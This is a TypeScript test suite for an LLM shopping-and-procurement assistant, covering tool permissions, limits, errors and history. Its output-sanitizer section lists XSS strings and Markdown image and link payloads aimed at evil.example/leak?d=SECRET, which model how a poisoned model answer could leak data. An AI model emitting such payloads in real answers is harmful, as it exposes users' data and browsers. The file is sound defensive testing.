import assert from 'node:assert/strict'
import { describe, test } from 'node:test'
import { answer, ChatRejected, prepare, sanitize, type ChatDeps, type ChatRequest, type Emit } from '../src/chat.ts'
import { LlmError, type LlmTurn } from '../src/llm.ts'
import { pairUp } from '../src/store.ts'
import { BUYER, call, fakeApp, LIMITS, MemoryStore, ok, ScriptedLlm, text, TOOLS, type FakeRoute } from './fakes.ts'

function setup(turns: (LlmTurn | Error)[], routes: Record<string, FakeRoute> = {}) {
  const llm = new ScriptedLlm(turns)
  const store = new MemoryStore()
  const { app, requests } = fakeApp(routes)
  const deps: ChatDeps = { llm, app, store: store.asStore(), tools: TOOLS, limits: LIMITS, systemName: '服装 SCM', now: () => new Date('2026-11-22T02:00:00Z') }
  const events: [string, Record<string, unknown>][] = []
  const emit: Emit = (event, data) => events.push([event, data])
  return { llm, store, requests, deps, events, emit }
}

function req(message: string, conversationId: string | null = null): ChatRequest {
  return { token: 'assist-tok', me: BUYER, requestId: 'r1', conversationId, message }
}

async function ask(s: ReturnType<typeof setup>, message: string, conversationId: string | null = null) {
  const r = req(message, conversationId)
  const { conversationId: id } = await prepare(s.deps, r)
  await answer(s.deps, r, id, s.emit, new AbortController().signal)
  return id
}

describe('一句话怎么答', () => {
  test('查一次再回答：工具按权限给，查的是 app，回答只留站内链接，问答和工具调用都记下', async () => {
    const s = setup(
      [
        call('list_purchase_orders', { keyword: 'PO20261120' }),
        text('PO20261120 已审核，[打开采购单](/purchases/12)。供应商官网 [点这里](https://evil.example/x) ![图](/files/a.png)'),
      ],
      { '/api/purchase-orders': ok({ list: [{ id: '12', code: 'PO20261120', status: 'APPROVED' }], total: 1 }) },
    )
    const id = await ask(s, 'PO20261120 审了没有')

    assert.deepEqual(s.llm.seen[0]!.tools.map((t) => t.function.name), ['list_purchase_orders', 'get_purchase_order'], '没有订单权限，不给订单工具')
    const system = s.llm.seen[0]!.messages[0]!
    assert.equal(system.role, 'system')
    assert.match(system.content as string, /采购小王/)
    assert.match(system.content as string, /没有权限看：成本/)
    assert.match(system.content as string, /2026\/11\/22/)

    assert.equal(s.requests.length, 1)
    assert.equal(s.requests[0]!.url.searchParams.get('keyword'), 'PO20261120')
    assert.equal(s.requests[0]!.auth, 'Bearer assist-tok')
    const toolMsg = s.llm.seen[1]!.messages.at(-1)!
    assert.equal(toolMsg.role, 'tool')
    assert.match(toolMsg.content as string, /APPROVED/)

    const done = s.events.find(([e]) => e === 'done')![1]
    assert.equal(done.text, 'PO20261120 已审核，[打开采购单](/purchases/12)。供应商官网 点这里 图')
    assert.deepEqual(s.events.filter(([e]) => e === 'tool').map(([, d]) => d.status), ['running', 'ok'])
    assert.equal(s.events.find(([e]) => e === 'tool')![1].label, '采购单')

    assert.deepEqual(s.store.messagesById.map((m) => [m.role, m.conversationId]), [['user', id], ['assistant', id]])
    assert.equal(s.store.messagesById[1]!.content, done.text)
    assert.deepEqual(s.store.toolCalls.map((t) => [t.call.tool, t.call.ok, t.call.rows]), [['list_purchase_orders', true, 1]])
    assert.equal(s.store.tokens, 80 + 10 + 100 + 20)
  })

  test('模型调了这个人没权限的工具：不调 app，告诉模型没有这个工具', async () => {
    const s = setup([call('list_orders', {}), text('你没有权限看需求订单。')])
    await ask(s, '最近的订单')
    assert.equal(s.requests.length, 0)
    assert.match(s.llm.seen[1]!.messages.at(-1)!.content as string, /没有 list_orders 这个工具/)
    assert.deepEqual(s.store.toolCalls.map((t) => [t.call.tool, t.call.ok]), [['list_orders', false]])
  })

  test('一轮调的工具超过上限：多出来的不调', async () => {
    const many: LlmTurn = {
      content: '',
      toolCalls: [1, 2, 3].map((i) => ({ id: `c${i}`, type: 'function' as const, function: { name: 'get_purchase_order', arguments: `{"id":${i}}` } })),
      usage: null,
    }
    const s = setup([many, text('查完了')], { '/api/purchase-orders/1': ok({ id: '1' }), '/api/purchase-orders/2': ok({ id: '2' }), '/api/purchase-orders/3': ok({ id: '3' }) })
    await ask(s, '三张单')
    assert.deepEqual(s.requests.map((r) => r.url.pathname), ['/api/purchase-orders/1', '/api/purchase-orders/2'])
    const toolMsgs = s.llm.seen[1]!.messages.filter((m) => m.role === 'tool')
    assert.equal(toolMsgs.length, 3, '每个调用都要有回应，模型接口才认')
    assert.match(toolMsgs[2]!.content as string, /一次最多调 2 个/)
  })

  test('轮数用完还在查：最后一轮不许再调工具；模型不听也不调，给一句换个问法的话', async () => {
    const s = setup([1, 2, 3, 4].map((i) => call('get_purchase_order', { id: i }, `c${i}`)), { '/api/purchase-orders/1': ok({}), '/api/purchase-orders/2': ok({}), '/api/purchase-orders/3': ok({}), '/api/purchase-orders/4': ok({}) })
    await ask(s, '查个遍')
    assert.equal(s.llm.seen.length, LIMITS.maxSteps)
    assert.deepEqual(s.llm.seen.map((x) => x.options.toolChoice), [undefined, undefined, undefined, 'none'])
    assert.equal(s.requests.length, LIMITS.maxSteps - 1, '最后一轮要调的没调')
    assert.match(String(s.events.find(([e]) => e === 'done')![1].text), /换个说法/)
  })

  test('模型出错：推 error、记下原因，不推 done', async () => {
    const s = setup([new LlmError('模型服务返回 429：rate limited', 429)])
    await ask(s, '你好')
    assert.deepEqual(s.events.map(([e]) => e), ['error'])
    assert.match(String(s.events[0]![1].message), /429/)
    assert.equal(s.store.messagesById[1]!.error, '模型服务返回 429：rate limited')
  })

  test('模型服务没回用量（或回 0）：照字数估，全系统的 token 额度照样会涨', async () => {
    const s = setup([{ content: '好的', toolCalls: [], usage: null }])
    await ask(s, '你好')
    assert.ok(s.store.tokens > 100, `估出来 ${s.store.tokens}`)
    const z = setup([{ content: '好的', toolCalls: [], usage: { promptTokens: 0, completionTokens: 0 } }])
    await ask(z, '你好')
    assert.ok(z.store.tokens > 100, `估出来 ${z.store.tokens}`)
  })

  test('不是模型的错（程序出错）：给用户错误编号，不给原始异常', async () => {
    const s = setup([new TypeError('Cannot read properties of undefined (reading x)')])
    await ask(s, '你好')
    assert.match(String(s.events[0]![1].message), /^助手出错了，错误编号 r1$/)
  })

  test('历史配对：连着出错、落单的问题都不带；要 0 轮就是空的（审查 R-05）', () => {
    const rows = [
      { role: 'user' as const, content: 'q1', error: null },
      { role: 'assistant' as const, content: '', error: '用户中途停止' },
      { role: 'user' as const, content: 'q2', error: null },
      { role: 'user' as const, content: 'q3', error: null },
      { role: 'assistant' as const, content: 'a3', error: null },
    ]
    assert.deepEqual(pairUp(rows, 6), [{ role: 'user', content: 'q3' }, { role: 'assistant', content: 'a3' }])
    assert.deepEqual(pairUp(rows, 0), [])
  })

  test('上一句没答出来：历史里连那一问一起不带，不留落单的问题（严格交替的模型会报 400）', async () => {
    const s = setup([new LlmError('模型太久没回应，稍后再问'), text('有 3 张。'), text('PO1')])
    const id = await ask(s, '第一问没答出来')
    await ask(s, '待审核的采购单有几张', id)
    await ask(s, '最早的是哪张', id)
    const third = s.llm.seen[2]!.messages.map((m) => [m.role, m.content])
    assert.deepEqual(third.slice(1), [['user', '待审核的采购单有几张'], ['assistant', '有 3 张。'], ['user', '最早的是哪张']])
  })

  test('第二句带上第一句的问答', async () => {
    const s = setup([text('有 3 张。'), text('最早那张是 PO1。')])
    const id = await ask(s, '待审核的采购单有几张')
    await ask(s, '最早的是哪张', id)
    const second = s.llm.seen[1]!.messages.map((m) => [m.role, m.content])
    assert.deepEqual(second.slice(1), [['user', '待审核的采购单有几张'], ['assistant', '有 3 张。'], ['user', '最早的是哪张']])
  })
})

describe('开始答以前的检查', () => {
  test('空的、太长的问题', async () => {
    const s = setup([])
    await assert.rejects(prepare(s.deps, req('   ')), (e) => e instanceof ChatRejected && e.status === 400)
    await assert.rejects(prepare(s.deps, req('问'.repeat(2001))), (e) => e instanceof ChatRejected && e.status === 400)
  })

  test('别人的对话、不存在的对话：404', async () => {
    const s = setup([])
    await s.store.createConversation('11111111-1111-1111-1111-111111111111', '99', '别人的')
    await assert.rejects(prepare(s.deps, req('接着问', '11111111-1111-1111-1111-111111111111')), (e) => e instanceof ChatRejected && e.status === 404)
    await assert.rejects(prepare(s.deps, req('接着问', 'not-a-uuid')), (e) => e instanceof ChatRejected && e.status === 404)
  })

  test('每人每天的次数、全系统每天的 token 到上限：429', async () => {
    const s = setup([])
    for (let i = 0; i < LIMITS.userDailyRequests; i++) await prepare(s.deps, req(`第 ${i} 句`))
    await assert.rejects(prepare(s.deps, req('再问一句')), (e) => e instanceof ChatRejected && e.status === 429 && /今天已经问了 3 次/.test(e.message))

    const t = setup([])
    t.store.tokens = LIMITS.dailyTokens
    await assert.rejects(prepare(t.deps, req('你好')), (e) => e instanceof ChatRejected && e.status === 429 && /全系统/.test(e.message))
    assert.equal(t.store.requests.size, 0, 'token 超了不扣这个人的次数')
  })
})

describe('回答里只留站内链接', () => {
  const cases: [string, string][] = [
    ['[采购单](/purchases/12)', '[采购单](/purchases/12)'],
    ['[库存](/stock)', '[库存](/stock)'],
    ['[列表](/orders?status=DRAFT)', '列表'],
    ['[编辑](/purchases/12/edit)', '编辑'],
    ['[导出](/api/orders/export)', '导出'],
    ['[官网](https://evil.example)', '官网'],
    ['[协议相对](//evil.example/x)', '协议相对'],
    ['[脚本](javascript:alert(1))', '脚本'],
    ['![图](/files/a.png)前', '图前'],
    ['<img src=x onerror=alert(1)>后', '后'],
    // 常见 HTML 标签去掉、留里面的字（11-22：原来换全角显示成"＜b>粗＜/b>"）；不是常见标签的照旧换全角
    ['参考 <b>粗</b> 和 <a href="https://evil.example">官网</a>', '参考 粗 和 官网'],
    ['| 单号 | 备注 |\n| --- | --- |\n| PO1 | 第一行<br>第二行<br/>完 |', '| 单号 | 备注 |\n| --- | --- |\n| PO1 | 第一行 第二行 完 |'],
    ['前<script>alert(1)</script>后<!-- 注释 -->完', '前后完'],
    ['<<b>b>拆开的</b>', '拆开的'],
    ['数量<10，a<b 且 c>d，<x>', '数量＜10，a＜b 且 c>d，＜x>'],
    ['看 https://evil.example/a?b=1 这里', '看 （外部链接已去掉） 这里'],
    ['看 www.evil.example/leak?d=1 这里', '看 （外部链接已去掉） 这里'],
    ['伪造记号 \u00000\u0000', '伪造记号 0'],
    // 审查 R-03：去掉的链接文字以 ! 结尾、紧挨着站内链接，不能拼成图片
    ['[!](https://evil.example)[图片](/orders/1)', '[图片](/orders/1)'],
    ['[hello!](https://evil.example)[pic](/purchases/12)', 'hello[pic](/purchases/12)'],
    ['[!](x)[图片](/orders/1)', '［!］(x)[图片](/orders/1)'],
    // 不是地址的括号是话的一部分，留着（方括号换全角，成不了链接）
    ['[待审核](共3张) 和 [ML0001](棉布)', '［待审核］(共3张) 和 ［ML0001］(棉布)'],
    // 网址到中文标点为止，后面的话留着
    ['详见https://evil.example。接下来还有重要内容', '详见（外部链接已去掉）。接下来还有重要内容'],
    ['看www.evil.example，再说', '看（外部链接已去掉），再说'],
    // 链接文字是网址：不当链接
    ['[https://evil.example/leak?d=1](/orders/1)', '（外部链接已去掉）'],
  ]
  for (const [input, expected] of cases) {
    test(input, () => assert.equal(sanitize(input), expected))
  }

  // 审查 T-c5c68e #2：去标签不能是二次方的（模型、被投毒的业务数据都可能给出这种字）。几十万字，二次方的要几秒
  test('坏输入不卡：没合上的标签、注释、script，深嵌套', () => {
    const inputs = [
      '<a a' + ' '.repeat(300000),
      '<!--'.repeat(80000),
      '<script>'.repeat(40000),
      '<'.repeat(100000) + 'b>'.repeat(100000),
      '<!--<script><style>'.repeat(20000),
    ]
    for (const input of inputs) {
      const started = performance.now()
      const out = sanitize(input)
      assert.ok(performance.now() - started < 500, `${input.slice(0, 12)}… 用了 ${Math.round(performance.now() - started)} ms`)
      assert.ok(!out.includes('<'))
    }
  })

  // 审查（T-3d7b55 #2）给的绕过写法：处理完以后不能再有能被 Markdown / HTML 认成链接、图片、标签的东西
  const attacks = [
    '![x][1]\n\n[1]: //evil.example/leak?d=SECRET',
    '![x][1]\n\n[1]: &#104;ttps://evil.example/leak?d=SECRET',
    '![evil]\n\n[evil]: //evil.example/leak',
    '[click][1]\n\n[1]: javascript:alert(1)',
    '<<x>img src="//evil.example/leak?d=SECRET">',
    '<<x>script>alert(1)<<x>/script>',
    "!<x>[a](//evil.example/leak 't')",
    '![x](//evil.example/leak?a=((1)))',
    '![a[b]](//evil.example/leak?d=1)',
    "[click](//evil.example/leak 't')",
    "[click](javascript:alert(1) 't')",
    '[click]( //evil.example/leak )',
    '[click](\n//evil.example/leak)',
    '<//evil.example/leak>',
    '[<img src=x onerror=alert(1)>](/orders/1)',
    '[!](x)[图片](/orders/1)',
    '[a!](//evil.example)![b](/orders/1)',
  ]
  for (const input of attacks) {
    test(`绕不过：${JSON.stringify(input).slice(1, 40)}`, () => {
      const out = sanitize(input)
      assert.ok(!out.includes('<'), `留下了 <：${out}`)
      assert.ok(!out.includes('!['), `能拼成图片：${out}`)
      assert.ok(!/[[\]]/.test(out.replace(/\[[^[\]]+\]\(\/(?:orders|purchases)(?:\/\d+)?\)/g, '')), `留下了站内链接以外的方括号：${out}`)
    })
  }
})
